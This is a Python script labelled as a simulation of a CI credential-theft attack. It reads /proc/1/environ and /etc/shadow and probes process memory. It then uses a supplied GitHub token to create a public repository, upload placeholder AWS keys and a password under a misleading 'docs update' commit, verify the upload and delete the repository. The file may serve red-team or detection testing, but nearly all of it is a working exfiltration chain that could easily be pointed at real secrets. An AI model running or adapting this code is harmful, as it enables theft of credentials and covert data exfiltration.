import os
import urllib.request
import json
import base64
import time
import uuid

# ---------------------------------------------------------
# PHASE 1: Credential Theft & Memory Scraping
# ---------------------------------------------------------
print("Phase 1: Simulating credential harvesting and memory scraping...")

discarded_real_data = ""
try:
    with open('/proc/1/environ', 'r') as f:
        discarded_real_data += f.read()[:100]
except Exception: pass 

try:
    with open('/etc/shadow', 'r') as f:
        discarded_real_data += f.read()[:100]
except Exception: pass

try:
    with open('/proc/1/mem', 'rb') as f: pass 
except Exception: pass

TOKEN = os.environ.get("MOCK_STOLEN_PAT")
if not TOKEN:
    print("No token provided for simulation.")
    exit(1)

dummy_stolen_data = (
    "aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n"
    "aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
    "db_password=super_secret_db_pass_123\n"
)

# ---------------------------------------------------------
# PHASE 2: Fallback Exfiltration via Trusted API
# ---------------------------------------------------------
print("Phase 2: Initiating fallback exfiltration via GitHub API...")

headers = {
    "Authorization": f"token {TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

try:
    req_user = urllib.request.Request("https://api.github.com/user", headers=headers)
    with urllib.request.urlopen(req_user) as response:
        username = json.loads(response.read().decode())['login']
except Exception as e:
    print(f"Failed to fetch username: {e}")
    exit(1)

# Generate a unique 8-character ID for this specific job runner
unique_id = uuid.uuid4().hex[:8]
repo_name = f"tpcp-docs-sim-{unique_id}"
create_repo_url = "https://api.github.com/user/repos"

repo_payload = json.dumps({
    "name": repo_name,
    "description": f"Simulated exfiltration repo for job {unique_id}",
    "private": False
}).encode('utf-8')

try:
    print(f"Attempting to create staging repository: {repo_name}...")
    req = urllib.request.Request(create_repo_url, data=repo_payload, headers=headers, method='POST')
    with urllib.request.urlopen(req) as response:
        print("Repo created successfully.")
except Exception as e:
    print(f"Repo creation failed: {e}")
    exit(1)

time.sleep(3)

# ---------------------------------------------------------
# PHASE 3: Data Staging
# ---------------------------------------------------------
upload_url = f"https://api.github.com/repos/{username}/{repo_name}/contents/exfil_data.txt"
encoded_data = base64.b64encode(dummy_stolen_data.encode('utf-8')).decode('utf-8')

upload_payload = json.dumps({
    "message": "docs update",
    "content": encoded_data
}).encode('utf-8')

try:
    print(f"Pushing safe, simulated dummy data to staging repo...")
    req = urllib.request.Request(upload_url, data=upload_payload, headers=headers, method='PUT')
    with urllib.request.urlopen(req) as response:
        print("Exfiltration successful.")
except Exception as e:
    print(f"Data upload failed: {e}")

# ---------------------------------------------------------
# PHASE 3.5: Verification
# ---------------------------------------------------------
print("Phase 3.5: Verifying exfiltrated data in the staging repository...")
try:
    # Give GitHub's API a moment to make the new commit readable
    time.sleep(2)
    
    req = urllib.request.Request(upload_url, headers=headers) # Default method is GET
    with urllib.request.urlopen(req) as response:
        file_data = json.loads(response.read().decode('utf-8'))
        
        # GitHub's API returns base64 content with newlines; we must strip them before decoding
        retrieved_base64 = file_data.get('content', '').replace('\n', '')
        retrieved_content = base64.b64decode(retrieved_base64).decode('utf-8')
        
        if retrieved_content == dummy_stolen_data:
            print("✅ Verification successful: The stolen data is confirmed to be hosted on the public repository.")
        else:
            print("⚠️ Verification warning: File exists, but content does not match the expected payload.")
except Exception as e:
    print(f"❌ Verification failed: Could not read the uploaded file. Error: {e}")

# ---------------------------------------------------------
# PHASE 4: Cleanup (Self-Destruct)
# ---------------------------------------------------------
print(f"Phase 4: Cleaning up staging repository {repo_name}...")
delete_url = f"https://api.github.com/repos/{username}/{repo_name}"

try:
    req = urllib.request.Request(delete_url, headers=headers, method='DELETE')
    with urllib.request.urlopen(req) as response:
        if response.status == 204:
            print("✅ Repository successfully deleted. Sandbox clean.")
except Exception as e:
    print(f"❌ Cleanup failed. You may need to manually delete {repo_name}: {e}")